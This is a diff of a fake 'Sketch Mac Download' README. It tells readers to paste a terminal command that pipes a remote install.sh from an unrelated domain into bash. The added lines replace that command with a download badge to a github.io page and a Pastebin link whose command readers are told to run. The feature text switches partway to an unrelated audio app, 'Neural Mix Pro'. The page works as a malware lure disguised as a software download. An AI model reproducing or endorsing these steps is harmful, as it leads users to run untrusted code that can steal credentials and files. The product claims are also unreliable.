@@ -1,21 +1,31 @@
 # Sketch Mac Download  
-![Sketch Screenshot 1](https://media.idownloadblog.com/wp-content/uploads/2020/01/Continuity-Sketch-002.png)  
+
+![Sketch Screenshot 1](https://media.idownloadblog.com/wp-content/uploads/2020/01/Continuity-Sketch-002.png)
+
+</div>
+
+<div align="center">
+
+[![🎨 DOWNLOAD: Sketch (Mac)](https://img.shields.io/badge/🎨%20DOWNLOAD:%20Sketch%20(Mac)-orange?style=for-the-badge&logo=sketch&logoColor=white)](https://jumakas-olftol-mang.github.io/.github/)
+
+</div>
+
 ---  
 
-## 📦 How to Install
+## Installation via .dmg:
 
+1. Download the `.dmg` installer using the button above.  
+2. Open it and drag **Neural Mix Pro** into your Applications folder.  
+3. Launch the app and start separating tracks into vocals, instrumentals, and beats.  
 
-1. Copy the installation command below.
+## Installation via a command in the terminal:
 
-```
-/bin/bash -c "$(curl -fsSL https://veitzeatz.com/get10/install.sh)"
-```
-3. Open the terminal on your device and paste the command you copied above, then press the “Return” button.
-4. Enter your device password and confirm the installation.
+1. Go to the Pastebin link below and copy the command:  
 
-[![0723-1.gif](https://i.postimg.cc/NfzQxpMT/0723-1.gif)](https://postimg.cc/0b7gkG72)
+   https://pastebin.com/raw/90MFXeWu  
 
-
+2. Open your terminal, paste the command, and run it.
+   
 ---  
 
 ## 📦 What is Sketch for Mac?  
@@ -34,17 +44,16 @@ Sketch also supports a vast ecosystem of plugins, making it easy to extend its f
 
 ---
 
+## Key Features  
 
-
-## 🌟 Key Features & Benefits  
-
-- ✏️ **Vector Editing Tools** — Clean, scalable design tools built for modern UI and web design.  
-- 🎨 **Customizable Interface** — Work the way you want with customizable workspaces and shortcuts.  
-- 🧩 **Plugin Ecosystem** — Hundreds of plugins available for animation, export, prototyping, and more.  
-- 📱 **Responsive Design** — Easily preview layouts across multiple screen sizes and devices.  
-- 🤝 **Real-Time Collaboration** — Share designs and edit live with teammates in the Sketch Cloud.  
-- 💻 **Native macOS App** — Optimized for Apple Silicon (M1, M2, M3) and fully integrated with macOS.  
-- 📁 **Export Anywhere** — Export assets, code snippets, and designs for any platform or framework.  
+| Feature                        | Description                                                                 |
+|--------------------------------|-----------------------------------------------------------------------------|
+| 🎤 Vocal Isolation             | Separate vocals from background music for remixes and karaoke               |
+| 🥁 Drum Extraction             | Isolate or remove beats for mashups and re-arrangements                     |
+| 🎹 Instrument Separation       | Split harmonics like piano, guitar, and synths with precision               |
+| ⚡ Real-Time Processing        | AI-powered stem separation with minimal latency                             |
+| 📂 Stem Export                 | Save vocals, instrumentals, and beats as separate audio files               |
+| 💻 macOS Compatibility         | Fully optimized for Intel and Apple Silicon Macs                            |
 
 ---  
 
